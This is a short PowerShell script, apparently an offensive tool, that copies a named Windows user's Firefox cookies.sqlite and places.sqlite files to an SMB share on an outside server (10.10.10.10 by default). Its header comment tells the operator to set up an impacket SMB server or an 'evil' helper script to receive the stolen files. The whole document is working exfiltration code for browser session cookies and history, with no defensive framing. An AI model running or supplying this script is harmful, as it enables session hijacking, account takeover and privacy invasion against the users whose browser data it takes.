```powershell
<#
Run impacket-smbserver -smb2support test yourself or use ff.sh -evil to do it automatically so you can receive files. Change IP in line 20 to prevent using -Server everytime
#>

<# gff -name $ShareName -Server #ServerPort #>
Set-Alias gff Get-Firefox

function Get-Firefox{
Param(
	[Parameter(Postition = 0, Mandatory=$True)]
	[String]
	$Name,

	[Parameter(Postition = 1, Mandatory=$False)]
	[String]
	$Server
)

if ($Server -eq ""){
	Set-Variable Server 10.10.10.10
}
else{
}

Write-Host "Copying $Name's Firefox Cookies/History to $Server"
Copy-Item -Path "C:\Users\$Name\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite" -Destination "\\$Server\$Name\cookies.sqlite"
Copy-Item -Path "C:\Users\$Name\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" -Destination "\\$Server\$Name\places.sqlite"
}
```